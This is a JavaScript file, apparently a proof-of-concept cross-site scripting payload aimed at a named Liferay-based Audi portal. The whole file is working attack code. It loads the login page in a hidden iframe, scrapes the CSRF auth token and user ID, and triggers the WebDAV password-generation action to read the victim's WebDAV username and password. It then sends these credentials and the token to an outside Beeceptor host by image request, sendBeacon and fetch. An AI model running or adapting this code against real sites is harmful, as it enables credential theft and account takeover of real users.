// credential-stealer-webdav.js - Complete WebDAV Credential Extraction
(function() {
    function extractWebDAVCredentials() {
        // Step 1: Load /login page in hidden iframe to extract authToken and userId
        var iframe = document.createElement('iframe');
        iframe.src = '/login';
        iframe.style.position = 'absolute';
        iframe.style.left = '-9999px';
        iframe.style.width = '1px';
        iframe.style.height = '1px';
        document.body.appendChild(iframe);
        
        iframe.onload = function() {
            setTimeout(function() {
                try {
                    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    var iframeHTML = iframeDoc.documentElement.outerHTML;
                    
                    // Step 2: Extract authToken from /login page
                    var authMatch = iframeHTML.match(/Liferay\.authToken\s*=\s*['"]([^'"]+)['"]/);
                    var authToken = authMatch ? authMatch[1] : '';
                    
                    // Step 3: Extract userId from /login page
                    var userMatch = iframeHTML.match(/getRealUserId\s*:\s*function\s*\(\)\s*\{\s*return\s*['"]?(\d+)['"]?/);
                    var userId = userMatch ? userMatch[1] : '';
                    
                    // Remove iframe
                    if (iframe.parentNode) {
                        iframe.parentNode.removeChild(iframe);
                    }
                    
                    if (!authToken || !userId) {
                        alert('Failed to extract from /login page\nauthToken: ' + authToken + '\nuserId: ' + userId);
                        return;
                    }
                    
                    // Step 4: Construct WebDAV password generation URL
                    var webdavUrl = 'https://meine-audi-erlebnis-abholung.audi.de/group/guest/~/control_panel/manage?p_p_id=com_liferay_my_account_web_portlet_MyAccountPortlet&p_p_lifecycle=1&p_p_state=exclusive&p_p_mode=view&_com_liferay_my_account_web_portlet_MyAccountPortlet_javax.portlet.action=/users_admin/generate_webdav_password&_com_liferay_my_account_web_portlet_MyAccountPortlet_mvcRenderCommandName=/users_admin/generate_webdav_password&_com_liferay_my_account_web_portlet_MyAccountPortlet_p_u_i_d=' + userId + '&p_auth=' + authToken;
                    
                    // Step 5: Fetch WebDAV credentials
                    fetch(webdavUrl)
                        .then(function(response) {
                            return response.text();
                        })
                        .then(function(html) {
                            // Step 6: Extract WebDAV username and password
                            var usernameMatch = html.match(/WebDAV-Benutzername[\s\S]*?value="([^"]+)"/);
                            var webdavUsername = usernameMatch ? usernameMatch[1] : '';
                            
                            var passwordMatch = html.match(/id="[^"]*webDAVPassword[^"]*"[^>]*value="([^"]+)"/);
                            var webdavPassword = passwordMatch ? passwordMatch[1] : '';
                            
                            if (!webdavUsername || !webdavPassword) {
                                alert('Failed to extract WebDAV credentials\nUsername: ' + webdavUsername + '\nPassword: ' + webdavPassword);
                                return;
                            }
                            
                            // Step 7: Display stolen credentials
                            var message = '╔══════════════════════════════════════╗\n';
                            message += '║   WebDAV CREDENTIALS STOLEN!        ║\n';
                            message += '╚══════════════════════════════════════╝\n\n';
                            message += '📧 WebDAV Username: ' + webdavUsername + '\n';
                            message += '🔑 WebDAV Password: ' + webdavPassword + '\n\n';
                            message += '👤 User ID: ' + userId + '\n';
                            message += '🎫 Auth Token: ' + authToken + '\n\n';
                            message += '🔗 Original URL:\n' + webdavUrl + '\n\n';
                            message += '✅ Data sent to attacker server!';
                            
                            alert(message);
                            
                            // Step 8: Exfiltrate to Beeceptor
                            var collaborator = 'https://naysser.free.beeceptor.com';
                            var payload = '/?webdav_user=' + encodeURIComponent(webdavUsername) + 
                                          '&webdav_pass=' + encodeURIComponent(webdavPassword) +
                                          '&user_id=' + encodeURIComponent(userId) +
                                          '&auth_token=' + encodeURIComponent(authToken) +
                                          '&timestamp=' + encodeURIComponent(new Date().toISOString());
                            
                            // Method 1: Image tag (most reliable, bypasses CORS)
                            var img = new Image();
                            img.src = collaborator + payload;
                            img.onerror = function() {
                                console.log('Image exfiltration completed');
                            };
                            document.body.appendChild(img);
                            
                            // Method 2: sendBeacon (reliable for logging)
                            if (navigator.sendBeacon) {
                                navigator.sendBeacon(collaborator + payload);
                            }
                            
                            // Method 3: Fetch API (backup)
                            fetch(collaborator + payload, {
                                mode: 'no-cors'
                            }).catch(function(e) {
                                console.log('Fetch completed:', e);
                            });
                            
                        })
                        .catch(function(error) {
                            alert('Error fetching WebDAV credentials: ' + error.message);
                        });
                        
                } catch(e) {
                    alert('Error accessing /login iframe: ' + e.message);
                }
            }, 2000); // Wait 2 seconds for /login page to fully load
        };
        
        iframe.onerror = function() {
            alert('Failed to load /login page');
        };
    }
    
    // Execute when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', extractWebDAVCredentials);
    } else {
        extractWebDAVCredentials();
    }
})();
